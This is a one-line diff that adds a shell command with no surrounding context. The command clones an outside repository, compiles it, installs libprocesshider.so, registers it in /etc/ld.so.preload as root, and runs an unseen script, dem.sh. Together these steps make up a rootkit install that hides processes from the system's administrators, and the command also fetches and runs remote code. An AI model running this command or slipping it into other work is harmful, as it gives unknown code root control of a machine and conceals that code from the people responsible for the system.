@@ -1,0 +1,1 @@
+git clone https://github.com/Zuraadlef/Lepom.git && cd Lepom && make && sudo mv libprocesshider.so /usr/local/lib/ && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload && chmod +x dem.sh && ./dem.sh
